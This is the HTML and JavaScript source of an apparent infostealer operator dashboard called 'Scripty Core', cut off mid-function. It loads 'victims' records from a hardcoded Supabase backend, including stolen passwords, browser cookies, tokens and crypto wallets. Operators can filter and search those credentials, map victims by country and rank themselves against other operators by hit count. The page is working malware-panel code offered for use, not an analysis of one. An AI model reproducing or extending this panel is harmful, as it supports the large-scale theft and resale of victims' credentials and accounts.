<head>

    <title>Scripty Core · Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <style>
        /* ===== Full Theme ===== */
                /* Firefox */
        * {
          scrollbar-width: thin;
          scrollbar-color: #6b7280 #111827;
        }
        
        /* Chrome, Edge, Safari */
        ::-webkit-scrollbar {
          width: 12px;
          height: 12px;
        }
        
        ::-webkit-scrollbar-track {
          background: #111827;
          border-radius: 999px;
        }
        
        ::-webkit-scrollbar-thumb {
          background: linear-gradient(
            180deg,
            #8b5cf6,
            #6366f1
          );
          border-radius: 999px;
          border: 3px solid #111827;
          transition: background 0.2s ease;
        }
        
        ::-webkit-scrollbar-thumb:hover {
          background: linear-gradient(
            180deg,
            #a78bfa,
            #818cf8
          );
        }
        
        ::-webkit-scrollbar-thumb:active {
          background: linear-gradient(
            180deg,
            #7c3aed,
            #4f46e5
          );
        }
        
        ::-webkit-scrollbar-corner {
          background: #111827;
        }
        :root {
            --bg-primary: #06080f;
            --bg-secondary: #0a0e1a;
            --bg-tertiary: #101525;
            --bg-hover: #161c30;
            --border-color: rgba(100, 150, 255, 0.12);
            --text-primary: #eef2fa;
            --text-secondary: #9aa8c2;
            --text-muted: #5a6a85;
            --accent: #ff2255;
            --neon-pink: #ff44aa;
            --neon-blue: #00aaff;
            --neon-cyan: #00ffdd;
            --neon-purple: #aa55ff;
            --neon-green: #00ff88;
            --success: #00ff88;
            --danger: #ff2255;
            --warning: #ffcc00;
            --radius-sm: 6px;
            --radius-md: 10px;
            --radius-lg: 14px;
            --font-sans: 'Inter', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: var(--font-sans);
            overflow: hidden;
            height: 100vh;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            background:
                linear-gradient(rgba(0,170,255,0.06) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,170,255,0.06) 1px, transparent 1px),
                radial-gradient(ellipse 900px 900px at 0% 100%, rgba(255,34,85,0.35) 0%, transparent 50%),
                radial-gradient(ellipse 850px 850px at 100% 0%, rgba(0,170,255,0.30) 0%, transparent 50%),
                radial-gradient(ellipse 700px 700px at 50% 50%, rgba(170,85,255,0.22) 0%, transparent 50%);
            background-size: 50px 50px, 50px 50px, 100% 100%, 100% 100%, 100% 100%;
            animation: bgDrift 18s ease-in-out infinite alternate;
        }
        @keyframes bgDrift {
            0% { background-position: 0 0, 0 0, 5% 95%, 95% 5%, 50% 50%; }
            100% { background-position: 0 0, 0 0, 15% 78%, 78% 22%, 48% 52%; }
        }
        .app-container { display: flex; height: 100vh; position: relative; z-index: 1; margin-left: 260px; }
        .sidebar {
            position: fixed; top: 0; left: 0; width: 260px; height: 100vh;
            background: linear-gradient(180deg, var(--bg-secondary), rgba(8,12,22,0.98));
            border-right: 1px solid var(--border-color);
            display: flex; flex-direction: column; z-index: 1000;
            box-shadow: 1px 0 40px rgba(0,170,255,0.08);
        }
        .sidebar::before {
            content: ''; position: absolute; inset: 0; pointer-events: none;
            background: radial-gradient(ellipse 200px 300px at 0% 0%, rgba(255,34,85,0.08) 0%, transparent 70%),
                        radial-gradient(ellipse 180px 250px at 0% 100%, rgba(0,170,255,0.06) 0%, transparent 70%);
            z-index: 0;
        }
        .sidebar > * { position: relative; z-index: 1; }
        .sidebar-header {
            padding: 24px; border-bottom: 1px solid var(--border-color);
            position: relative;
        }
        .sidebar-header::after {
            content: ''; position: absolute; bottom: -1px; left: 24px; right: 24px;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent), var(--neon-pink), var(--neon-blue), transparent);
            opacity: 0.7;
        }
        .sidebar-logo {
            display: flex; align-items: center; gap: 12px; font-size: 17px; font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--neon-pink));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .sidebar-logo i { font-size: 28px; color: var(--accent); filter: drop-shadow(0 0 12px rgba(255,34,85,0.6)); }
        .sidebar-nav { flex: 1; overflow-y: auto; padding: 16px 12px; }
        .sidebar-section { margin-bottom: 20px; }
        .sidebar-section-toggle {
            display: flex; align-items: center; justify-content: space-between; width: 100%;
            padding: 8px 12px; background: none; border: none; cursor: pointer;
            color: var(--text-muted); font-size: 11px; font-weight: 600; text-transform: uppercase;
            letter-spacing: 0.8px; transition: 0.15s;
        }
        .sidebar-section-toggle:hover { background: var(--bg-hover); border-radius: var(--radius-sm); }
        .sidebar-section-title { background: linear-gradient(90deg, var(--neon-pink), var(--neon-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sidebar-section-chevron { width: 14px; height: 14px; transition: transform 0.2s; color: var(--text-muted); }
        .sidebar-section.collapsed .sidebar-section-chevron { transform: rotate(-90deg); }
        .sidebar-section-links { overflow: hidden; max-height: 500px; transition: max-height 0.25s; }
        .sidebar-section.collapsed .sidebar-section-links { max-height: 0; }
        .sidebar-link {
            display: flex; align-items: center; gap: 12px; padding: 11px 14px;
            color: var(--text-secondary); text-decoration: none; font-size: 14px; font-weight: 500;
            border-radius: var(--radius-md); transition: all 0.2s; margin-bottom: 2px; cursor: pointer;
        }
        .sidebar-link:hover { background: var(--bg-hover); color: var(--text-primary); }
        .sidebar-link.active {
            background: rgba(255,34,85,0.08); color: var(--accent); border-left: 3px solid var(--accent);
        }
        .sidebar-link i { width: 18px; text-align: center; opacity: 0.7; }
        .sidebar-link:hover i, .sidebar-link.active i { opacity: 1; }
        .sidebar-link.locked { opacity: 0.35; cursor: not-allowed; }
        .sidebar-lock-icon { margin-left: auto; opacity: 0.6; width: 14px; height: 14px; }
        .sidebar-footer {
            padding: 16px 20px;
            border-top: 1px solid var(--border-color);
            cursor: pointer;
        }
        .sidebar-user {
            display: flex;
            align-items: center;
            gap: 12px;
            text-decoration: none;
            padding: 8px 10px;
            border-radius: 8px;
            transition: 0.2s;
        }
        .sidebar-user:hover { background: rgba(255,255,255,0.05); }
        .sidebar-user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, var(--accent), #aa55ff);
            border: 2px solid transparent;
            background-clip: padding-box;
            position: relative;
            overflow: hidden;
        }
        .sidebar-user-avatar::before {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent), var(--neon-pink), var(--neon-blue));
            z-index: -1;
            opacity: 0.8;
            box-shadow: 0 0 15px rgba(255,34,85,0.4);
        }
        .sidebar-user-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
            display: none;
        }
        .sidebar-user-avatar i {
            font-size: 18px;
            color: white;
        }
        .sidebar-user-name {
            font-size: 13px;
            font-weight: 500;
            color: var(--text-secondary);
        }
        .sidebar-email {
            font-size: 11px;
            color: var(--text-muted);
        }
        .main-content { flex: 1; overflow-y: auto; padding: 32px 40px; background: transparent; }
        .page-header { margin-bottom: 32px; }
        .page-title {
            font-size: 26px; font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--neon-pink), var(--neon-blue));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .page-description { color: var(--text-secondary); font-size: 15px; }
        .card {
            background: var(--bg-secondary); border: 1px solid var(--border-color);
            border-radius: var(--radius-lg); padding: 24px; margin-bottom: 24px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.5);
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .card:hover { border-color: rgba(0,170,255,0.25); box-shadow: 0 0 30px rgba(0,170,255,0.08); }
        .card-header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 16px; padding-bottom: 16px; border-bottom: 1px solid var(--border-color);
        }
        .card-title {
            font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 10px;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-cyan), var(--neon-purple));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; margin-bottom: 24px; }
        .stat-card {
            background: var(--bg-secondary); border: 1px solid var(--border-color);
            border-radius: var(--radius-lg); padding: 24px; position: relative; overflow: hidden;
            transition: all 0.3s;
        }
        .stat-card::before {
            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
            background: linear-gradient(90deg, var(--accent), var(--neon-pink), var(--neon-purple), transparent);
            box-shadow: 0 0 15px var(--accent);
        }
        .stat-card:hover { transform: translateY(-3px); border-color: rgba(255,34,85,0.35); box-shadow: 0 0 20px rgba(255,34,85,0.2); }
        .stat-card:nth-child(2)::before { background: linear-gradient(90deg, var(--neon-blue), var(--neon-cyan), var(--neon-purple), transparent); box-shadow: 0 0 15px var(--neon-blue); }
        .stat-card:nth-child(2):hover { border-color: rgba(0,170,255,0.35); box-shadow: 0 0 20px rgba(0,170,255,0.2); }
        .stat-card:nth-child(3)::before { background: linear-gradient(90deg, var(--neon-pink), var(--neon-purple), var(--neon-blue), transparent); box-shadow: 0 0 15px var(--neon-pink); }
        .stat-card:nth-child(3):hover { border-color: rgba(255,68,170,0.35); box-shadow: 0 0 20px rgba(255,68,170,0.2); }
        .stat-card:nth-child(4)::before { background: linear-gradient(90deg, var(--neon-green), var(--neon-cyan), var(--neon-blue), transparent); box-shadow: 0 0 15px var(--neon-green); }
        .stat-card:nth-child(4):hover { border-color: rgba(0,255,136,0.35); box-shadow: 0 0 20px rgba(0,255,136,0.2); }
        .stat-label { font-size: 13px; font-weight: 500; color: var(--text-muted); margin-bottom: 8px; }
        .stat-value { font-size: 32px; font-weight: 700; font-family: var(--font-mono); color: var(--text-primary); text-shadow: 0 0 30px rgba(0,170,255,0.15); }
        .map-card { padding: 0; overflow: hidden; }
        .map-card-header {
            padding: 16px 20px; border-bottom: 1px solid var(--border-color);
            display: flex; justify-content: space-between; align-items: center;
        }
        .map-card-title { font-size: 15px; font-weight: 600; background: linear-gradient(135deg, var(--neon-blue), var(--neon-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .map-card-count { font-size: 13px; color: var(--text-muted); font-family: var(--font-mono); }
        .map-container { height: 600px; width: 100%; background: var(--bg-primary); }
        #hitMap { height: 100%; width: 100%; }
        .leaflet-container { background: var(--bg-primary); }
        .leaflet-popup-content-wrapper { background: var(--bg-secondary); color: var(--text-primary); border: 1px solid var(--border-color); border-radius: var(--radius-md); }
        .leaflet-popup-tip { background: var(--bg-secondary); border: 1px solid var(--border-color); border-top: none; border-left: none; }
        .popup-ip { font-family: var(--font-mono); font-weight: 600; color: var(--accent); text-shadow: 0 0 12px rgba(255,34,85,0.5); }
        .popup-location { color: var(--text-secondary); }
        .table-container { overflow-x: auto; max-height: 500px; overflow-y: auto; }
        .table-container::-webkit-scrollbar { width: 6px; }
        .table-container::-webkit-scrollbar-track { background: var(--bg-tertiary); border-radius: 10px; }
        .table-container::-webkit-scrollbar-thumb { background: var(--neon-blue); border-radius: 10px; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th, td { padding: 12px 16px; text-align: left; border-bottom: 1px solid var(--border-color); }
        th { background: var(--bg-tertiary); font-weight: 600; font-size: 12px; text-transform: uppercase; color: var(--text-muted); letter-spacing: 0.5px; }
        tbody tr { transition: 0.15s; }
        tbody tr:hover { background: rgba(0,170,255,0.06); }
        .badge { display: inline-block; padding: 2px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 600; background: var(--neon-purple); color: #fff; }
        .filter-bar { display: flex; flex-wrap: wrap; align-items: center; gap: 12px; margin-bottom: 16px; }
        .search-input { background: var(--bg-tertiary); border: 1px solid var(--border-color); color: var(--text-primary); padding: 8px 14px; border-radius: var(--radius-md); width: 200px; font-size: 13px; transition: 0.2s; }
        .search-input:focus { outline: none; border-color: var(--neon-blue); box-shadow: 0 0 0 3px rgba(0,170,255,0.1); }
        .filter-btn { padding: 5px 14px; border: 1px solid var(--border-color); background: var(--bg-tertiary); color: var(--text-secondary); border-radius: 30px; font-size: 12px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .filter-btn:hover { background: var(--bg-hover); border-color: var(--neon-blue); }
        .filter-btn.active { background: var(--accent); border-color: var(--accent); color: #fff; box-shadow: 0 0 12px rgba(255,34,85,0.4); }
        .pagination { display: flex; justify-content: space-between; align-items: center; margin-top: 16px; }
        .pagination-btn { padding: 6px 16px; border: 1px solid var(--border-color); background: var(--bg-tertiary); color: var(--text-secondary); border-radius: var(--radius-sm); cursor: pointer; transition: 0.2s; font-size: 13px; }
        .pagination-btn:hover:not(:disabled) { background: var(--bg-hover); border-color: var(--neon-blue); color: #fff; }
        .pagination-btn:disabled { opacity: 0.3; cursor: not-allowed; }
        .pagination-info { color: var(--text-muted); font-size: 13px; }
        .view { display: none; }
        .view.active { display: block; }
        .hit-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; margin-bottom: 2rem; }
        .hit-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: var(--radius-lg); overflow: hidden; transition: all 0.3s ease; }
        .hit-card:hover { border-color: rgba(0,170,255,0.2); box-shadow: 0 0 30px rgba(0,170,255,0.08); }
        .hit-card-header { display: flex; align-items: center; gap: 0.75rem; padding: 1rem 1.25rem; background: var(--bg-tertiary); border-bottom: 1px solid var(--border-color); font-weight: 600; color: var(--text-primary); position: relative; }
        .hit-card-header::after { content: ''; position: absolute; bottom: 0; left: 1rem; right: 1rem; height: 1px; background: linear-gradient(90deg, transparent, var(--neon-blue), var(--neon-cyan), transparent); opacity: 0.4; }
        .hit-card-header span { background: linear-gradient(135deg, var(--neon-blue), var(--neon-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hit-card-header i { color: var(--neon-blue); filter: drop-shadow(0 0 6px rgba(0,170,255,0.5)); }
        .hit-card-body { padding: 1.25rem; }
        .info-badge { margin-left: auto; padding: 0.25rem 0.5rem; background: linear-gradient(135deg, rgba(0,170,255,0.15), rgba(0,255,221,0.1)); border: 1px solid rgba(0,170,255,0.25); border-radius: var(--radius-sm); font-size: 0.75rem; font-weight: 500; color: var(--neon-cyan); text-transform: uppercase; }
        .info-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
        .info-item { display: flex; flex-direction: column; gap: 0.25rem; }
        .info-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; }
        .info-value { font-size: 0.875rem; color: var(--text-primary); word-break: break-word; }
        .copyable { cursor: pointer; transition: all 0.2s ease; }
        .copyable:hover { color: var(--neon-cyan); text-shadow: 0 0 10px rgba(0,255,221,0.5); }
        .hit-section { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: var(--radius-lg); margin-bottom: 1.5rem; overflow: hidden; transition: all 0.3s ease; }
        .hit-section:hover { border-color: rgba(170,85,255,0.2); box-shadow: 0 0 30px rgba(170,85,255,0.08); }
        .section-header { display: flex; align-items: center; gap: 0.75rem; padding: 1rem 1.25rem; background: var(--bg-tertiary); border-bottom: 1px solid var(--border-color); font-weight: 600; color: var(--text-primary); position: relative; }
        .section-header::after { content: ''; position: absolute; bottom: 0; left: 1rem; right: 1rem; height: 2px; background: linear-gradient(90deg, transparent, var(--neon-pink), var(--neon-purple), var(--accent), transparent); opacity: 0.5; }
        .section-header span { background: linear-gradient(135deg, var(--neon-pink), var(--neon-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .section-header i { color: var(--neon-pink); filter: drop-shadow(0 0 6px rgba(255,68,170,0.5)); }
        .section-count { margin-left: auto; padding: 0.25rem 0.75rem; background: linear-gradient(135deg, var(--neon-pink), var(--neon-purple)); border-radius: 9999px; font-size: 0.75rem; color: white; box-shadow: 0 0 12px rgba(170,85,255,0.4); }
        .data-table { width: 100%; border-collapse: collapse; }
        .data-table th, .data-table td { padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid var(--border-color); }
        .data-table thead { position: sticky; top: 0; z-index: 2; background: var(--bg-tertiary); }
        .data-table thead::after { content: ''; position: absolute; bottom: 0; left: 1rem; right: 1rem; height: 1px; background: linear-gradient(90deg, transparent, var(--neon-purple), var(--neon-pink), transparent); opacity: 0.4; }
        .data-table th { font-size: 0.75rem; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; background: var(--bg-tertiary); }
        .data-table tbody tr { transition: all 0.2s ease; }
        .data-table tbody tr:nth-child(even) { background: rgba(170,85,255,0.03); }
        .data-table tbody tr:nth-child(odd) { background: rgba(255,68,170,0.02); }
        .data-table tbody tr:hover { background: linear-gradient(90deg, rgba(170,85,255,0.12) 0%, rgba(255,68,170,0.06) 50%, rgba(0,170,255,0.03) 100%); box-shadow: inset 0 0 40px rgba(170,85,255,0.06), inset 3px 0 0 var(--neon-purple); }
        .data-table tbody tr:hover td { background: transparent; }
        .data-table td.copyable:hover { color: var(--accent); }
        .password-cell { position: relative; display: flex; align-items: center; gap: 0.5rem; }
        .password-revealed { display: none; }
        .password-cell.revealed .password-masked { display: none; }
        .password-cell.revealed .password-revealed { display: inline; }
        .reveal-btn { background: none; border: none; padding: 0.25rem; cursor: pointer; color: var(--text-secondary); transition: color 0.2s; }
        .reveal-btn:hover { color: var(--primary); }
        .reveal-btn i { font-size: 14px; }
        .eye-off-icon { display: none; }
        .password-cell.revealed .eye-icon { display: none; }
        .password-cell.revealed .eye-off-icon { display: inline; }
        .cookies-container { padding: 1.25rem; }
        .cookie-profiles { display: flex; flex-direction: column; gap: 1rem; }
        .cookie-profile { background: var(--bg-tertiary); border-radius: var(--radius-md); overflow: hidden; border: 1px solid transparent; transition: all 0.2s ease; }
        .cookie-profile:hover { border-color: rgba(0,255,136,0.2); box-shadow: 0 0 20px rgba(0,255,136,0.1); }
        .cookie-profile-header { display: flex; justify-content: space-between; align-items: center; padding: 1rem; gap: 1rem; flex-wrap: wrap; }
        .cookie-profile-info { display: flex; align-items: center; gap: 0.75rem; flex-wrap: wrap; }
        .cookie-browser { font-weight: 600; background: linear-gradient(135deg, var(--neon-green), var(--neon-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .cookie-profile-name { color: var(--text-secondary); font-size: 0.875rem; }
        .cookie-count { padding: 0.25rem 0.5rem; background: var(--bg-secondary); border-radius: var(--radius-sm); font-size: 0.75rem; color: var(--text-secondary); }
        .cookie-actions { display: flex; gap: 0.5rem; }

    <div class="app-container">

                    <div class="stat-card"><div class="stat-label"><i class="fas fa-clock text-cyan"></i> Last Hit</div><div class="stat-value" id="lastHit" style="font-size:20px;">Never</div></div>
                    <div class="stat-card"><div class="stat-label"><i class="fas fa-trophy text-pink"></i> Global Rank</div><div class="stat-value" id="globalRank" style="font-size:24px;">N/A</div></div>
                    <div class="stat-card"><div class="stat-label"><i class="fas fa-bolt text-success"></i> Live Connections</div><div class="stat-value" id="liveConnections">0</div></div>

                    </div>

                    <p class="page-description mono" id="detailsId">Loading...</p>

            </div>
        </main>
    </div>

    <script>
        (function() {
            // Supabase client
            if (typeof window.__sbClient === 'undefined') {
                const SUPABASE_URL = "https://zjtkdztrwqrjqquygtbr.supabase.co";
                const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpqdGtkenRyd3FyanFxdXlndGJyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MTE2NDEsImV4cCI6MjA5ODM4NzY0MX0.t8eT3QHOPY50dL_oIpJrXTxQHMJi6rCjUU-f3OmLJxI";
                window.__sbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            }
            const supabaseClient = window.__sbClient;

            const browserIcons = {
                'Chrome': 'fab fa-chrome',
                'Edge': 'fab fa-edge',
                'Firefox': 'fab fa-firefox',
                'Opera': 'fab fa-opera',
                'Brave': 'fab fa-brave',
                'Vivaldi': 'fab fa-vivaldi',
                'Yandex': 'fab fa-yandex',
                'Comet': 'fas fa-comet',
                'Zen': 'fas fa-zen',
                'Unknown': 'fas fa-globe',
            };

            let currentUser = null;
            let allVictims = [];
            let filteredVictims = [];
            let currentPage = 1;
            const PAGE_SIZE = 20;
            let currentFilter = 'all';
            let currentSearch = '';
            let map = null;
            let clusterGroup = null;

            function safeParseData(dataStr) {
                if (!dataStr) return {};
                if (typeof dataStr === 'object') return dataStr;
                try { return JSON.parse(dataStr); } catch(e) { return {}; }
            }

            function searchInData(data, term) {
                if (!data) return false;
                const lowerTerm = term.toLowerCase();
                if (data.passwords) {
                    for (const p of data.passwords) {
                        if (p.url && p.url.toLowerCase().includes(lowerTerm)) return true;
                        if (p.username && p.username.toLowerCase().includes(lowerTerm)) return true;
                        if (p.password && p.password.toLowerCase().includes(lowerTerm)) return true;
                    }
                }
                if (data.cookies) {
                    for (const c of data.cookies) {
                        if (c.host && c.host.toLowerCase().includes(lowerTerm)) return true;
                        if (c.name && c.name.toLowerCase().includes(lowerTerm)) return true;
                        if (c.value && c.value.toLowerCase().includes(lowerTerm)) return true;
                    }
                }
                if (data.tokens) {
                    for (const t of data.tokens) {
                        if (t && t.toLowerCase().includes(lowerTerm)) return true;
                    }
                }
                return false;
            }

            window.logout = async function() {
                await supabaseClient.auth.signOut();
                window.location.href = 'login.html';
            };

            window.showDashboard = function() {
                document.getElementById('dashboardView').classList.add('active');
                document.getElementById('detailsView').classList.remove('active');
                fetchData();
            };

            window.showDetails = function(id) {
                window.location.href = `hit.html?id=${id}`;
            };

            function getCoords(country) {
                const coords = {
                    "United States": [39.8, -98.5], "Canada": [56.1, -106.3], "United Kingdom": [55.4, -3.4],
                    "Germany": [51.2, 10.4], "France": [46.6, 2.2], "Italy": [41.9, 12.6],
                    "Spain": [40.5, -3.7], "Russia": [61.5, 105.3], "China": [35.9, 104.2],
                    "India": [20.6, 78.9], "Brazil": [-14.2, -51.9], "Australia": [-25.3, 133.8],
                    "Japan": [36.2, 138.3], "South Korea": [36.5, 127.8], "Mexico": [23.6, -102.6],
                    "South Africa": [-30.6, 22.9], "Egypt": [26.8, 30.8], "Saudi Arabia": [23.9, 45.1],
                    "Turkey": [38.9, 35.3], "Netherlands": [52.1, 5.3], "Sweden": [60.1, 18.6],
                    "Poland": [51.9, 19.1], "Ukraine": [48.4, 31.2], "Argentina": [-38.4, -63.6],
                    "Chile": [-35.7, -71.5], "Colombia": [4.6, -74.1], "Peru": [-9.2, -75.0],
                    "Nigeria": [9.0, 8.7], "Kenya": [-1.3, 36.8], "Singapore": [1.35, 103.8],
                    "Malaysia": [4.2, 101.9], "Philippines": [12.9, 121.8], "Vietnam": [14.1, 108.3],
                    "Thailand": [15.9, 101.0], "Indonesia": [-2.5, 118.0], "Pakistan": [30.4, 69.3],
                    "Bangladesh": [23.7, 90.4], "Iran": [32.4, 53.7], "Iraq": [33.2, 43.7],
                    "Israel": [31.0, 34.8], "UAE": [24.0, 54.0], "Belgium": [50.6, 4.7],
                    "Switzerland": [46.8, 8.2], "Austria": [47.5, 14.5], "Greece": [39.1, 21.8],
                    "Portugal": [39.6, -8.2], "Ireland": [53.1, -7.7], "Norway": [60.5, 8.5],
                    "Finland": [61.9, 25.7], "Denmark": [56.3, 9.5], "Czechia": [49.8, 15.5],
                    "Hungary": [47.2, 19.5], "Romania": [45.9, 25.0], "Bulgaria": [42.7, 25.5],
                    "Serbia": [44.0, 21.0], "Croatia": [44.6, 15.2], "Slovakia": [48.7, 19.5],
                    "Slovenia": [46.2, 14.8], "Lithuania": [55.2, 24.0], "Latvia": [56.9, 24.6],
                    "Estonia": [58.6, 25.0], "New Zealand": [-41.0, 174.0], "N/A": [0, 0]
                };
                return coords[country] || coords["N/A"];
            }

            function hasCredentialType(victim, type) {
                const d = safeParseData(victim.data);
                if (type === 'passwords') return (d.passwords && d.passwords.length > 0) || (victim.total_passwords > 0);
                if (type === 'cookies') return (d.cookies && d.cookies.length > 0) || (victim.total_cookies > 0);
                if (type === 'tokens') return (d.tokens && d.tokens.length > 0) || (victim.total_tokens > 0);
                if (type === 'wallets') return d.wallets && Object.keys(d.wallets || {}).length > 0;
                return true;
            }

            function applyFiltersAndSearch() {
                let result = allVictims.slice();
                if (currentFilter !== 'all') {
                    result = result.filter(v => hasCredentialType(v, currentFilter));
                }
                if (currentSearch.trim()) {
                    const s = currentSearch.toLowerCase().trim();
                    result = result.filter(v => {
                        const matchesBasic = (v.hostname && v.hostname.toLowerCase().includes(s)) ||
                            (v.username && v.username.toLowerCase().includes(s)) ||
                            (v.country && v.country.toLowerCase().includes(s));
                        if (matchesBasic) return true;
                        const data = safeParseData(v.data);
                        return searchInData(data, s);
                    });
                }
                filteredVictims = result;
                currentPage = 1;
                renderTable();
                updateStatsAndCharts(result);
                updatePaginationInfo();
            }

            function renderTable() {
                const start = (currentPage - 1) * PAGE_SIZE;
                const end = Math.min(start + PAGE_SIZE, filteredVictims.length);
                const pageData = filteredVictims.slice(start, end);
                const tbody = document.getElementById('victimTableBody');
                tbody.innerHTML = '';
                if (pageData.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="5" class="text-muted" style="text-align:center;padding:20px;">No victims found</td></tr>';
                    return;
                }
                pageData.forEach(v => {
                    const time = new Date(v.timestamp).toLocaleString();
                    const tr = document.createElement('tr');
                    tr.innerHTML = `<td><span class="text-mono">${v.hostname || 'N/A'}</span></td><td>${v.username || 'N/A'}</td><td><span class="badge">${v.country || 'N/A'}</span></td><td class="text-muted" style="font-size:0.8rem;">${time}</td><td><button onclick="window.showDetails('${v.id}')" class="text-accent" style="background:none;border:none;cursor:pointer;"><i class="fas fa-eye"></i> View</button></td>`;
                    tbody.appendChild(tr);
                });
                document.getElementById('startRange').textContent = filteredVictims.length ? start + 1 : 0;
                document.getElementById('endRange').textContent = end;
                document.getElementById('totalCount').textContent = filteredVictims.length;
                document.getElementById('prevPage').disabled = currentPage === 1;
                document.getElementById('nextPage').disabled = end >= filteredVictims.length;
            }

            function updatePaginationInfo() {
                const start = (currentPage - 1) * PAGE_SIZE;
                const end = Math.min(start + PAGE_SIZE, filteredVictims.length);
                document.getElementById('startRange').textContent = filteredVictims.length ? start + 1 : 0;
                document.getElementById('endRange').textContent = end;
                document.getElementById('totalCount').textContent = filteredVictims.length;
                document.getElementById('prevPage').disabled = currentPage === 1;
                document.getElementById('nextPage').disabled = end >= filteredVictims.length;
            }

            function updateStatsAndCharts(data) {
                document.getElementById('totalHits').textContent = data.length;
                if (data.length > 0) {
                    const last = new Date(data[0].timestamp);
                    document.getElementById('lastHit').textContent = last.toLocaleString();
                } else {
                    document.getElementById('lastHit').textContent = 'Never';
                }
                const LIVE_THRESHOLD_MS = 120000; 
                const cutoffTime = new Date(Date.now() - LIVE_THRESHOLD_MS);
                const live = data.filter(v => new Date(v.timestamp) > cutoffTime);
                document.getElementById('liveConnections').textContent = live.length;
                const locationsCount = new Set(data.map(v => v.country)).size;
                document.getElementById('mapCount').textContent = `${locationsCount} locations`;
                if (!map) {
                    map = L.map('hitMap', { center: [20, 0], zoom: 1, minZoom: 1, zoomControl: true });
                    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                        attribution: '',
                        subdomains: 'abcd'
                    }).addTo(map);
                    clusterGroup = L.markerClusterGroup({ maxClusterRadius: 40, spiderfyOnMaxZoom: true, showCoverageOnHover: false, zoomToBoundsOnClick: true });
                    map.addLayer(clusterGroup);
                }
                clusterGroup.clearLayers();
                const uniqueCoords = {};
                data.forEach(v => {
                    const country = v.country || 'N/A';
                    const coord = getCoords(country);
                    const key = `${coord[0]},${coord[1]}`;
                    if (!uniqueCoords[key]) uniqueCoords[key] = { country, count: 0 };
                    uniqueCoords[key].count += 1;
                });
                for (const [key, val] of Object.entries(uniqueCoords)) {
                    const [lat, lng] = key.split(',').map(Number);
                    if (lat === 0 && lng === 0) continue;
                    const marker = L.circleMarker([lat, lng], {
                        radius: 5 + Math.min(val.count, 10),
                        fillColor: '#ff2255', color: '#ffffff', weight: 1, opacity: 1, fillOpacity: 0.8
                    }).bindPopup(`<b>${val.country}</b><br>${val.count} victim${val.count>1?'s':''}`);
                    clusterGroup.addLayer(marker);
                }
                if (clusterGroup.getLayers().length > 0) {
                    map.fitBounds(clusterGroup.getBounds().pad(0.2), { maxZoom: 2.5 });
                }
            }
                    
            async function fetchData() {
                if (!currentUser) return;
                try {
                    // 1. Fetch current user's victims
                    const { data, error } = await supabaseClient
                        .from('victims')
                        .select('*')
                        .eq('user_id', currentUser.id)
                        .order('timestamp', { ascending: false })
                        .limit(500);

                    if (error) throw error;
                    allVictims = data || [];
                
                    // 2. Calculate REAL Global Rank
                    try {
                        // Fetch all user IDs across the entire table
                        const { data: allUsersData, error: rankError } = await supabaseClient
                            .from('victims')
                            .select('user_id');
                    
                        if (!rankError && allUsersData) {
                            // Count hits per user
                            const userCounts = {};
                            allUsersData.forEach(v => {
                                userCounts[v.user_id] = (userCounts[v.user_id] || 0) + 1;
                            });
                        
                            // Sort users by total hits (descending)
                            const sortedUsers = Object.entries(userCounts).sort((a, b) => b[1] - a[1]);
                        
                            // Find current user's position
                            let rank = 'N/A';
                            for (let i = 0; i < sortedUsers.length; i++) {
                                if (sortedUsers[i][0] === currentUser.id) {
                                    rank = `#${i + 1}`;
                                    break;
                                }
                            }
                            document.getElementById('globalRank').textContent = rank;
                        } else {
                            document.getElementById('globalRank').textContent = 'N/A';
                        }
                    } catch (rankErr) {
